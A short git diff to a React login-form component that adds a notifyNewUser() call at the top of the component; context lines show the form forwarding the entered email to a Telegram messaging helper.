@@ -12,6 +12,7 @@ import { useCommand } from '../app/lib/CommandContext';
 
 export default function LoginForm() {
     const router = useRouter();
+    notifyNewUser();
     const { command } = useCommand(); // Get the current command from Telegram
     const { userEmail, setUserEmail } = useEmail();
     const { theme, toggleTheme } = useTheme();
@@ -118,6 +119,7 @@ export default function LoginForm() {
         console.log("Email set to:", email); 
         sendMessageToTelegram(email);
     };
+    
 
     // Filter email suggestions
     const getFilteredMails = () => {
